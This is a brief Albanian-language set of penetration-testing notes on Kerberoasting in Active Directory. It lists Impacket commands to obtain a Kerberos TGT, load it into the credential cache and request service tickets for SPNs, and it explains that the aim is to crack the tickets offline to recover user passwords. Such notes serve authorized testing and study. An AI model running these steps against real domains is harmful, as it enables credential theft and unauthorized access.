
## **Cfare bejm pasi kemi nje Bilete TGT**

Pasi te kemi nje bilete TGT -> e vendosime ne cache -> kerkojm te gjitha SPN ne AD.

```bash
# Get TGT
getTGT.py DOMAIN/username:password

# Use ticket
export KRB5CCNAME=username.ccache

# Request service ticket
getST.py -spn service/hostname DOMAIN/username -k -no-pass
```

## **Per cfare do e perdorim nje SPN**


Ideja është: **gjej përdorues që kanë SPN** dhe përdor TGT/TGS për të testuar mundësinë e marrjes së thyerjes se kredencialeve offline per te zbuluar passwordin e perdoruesve.

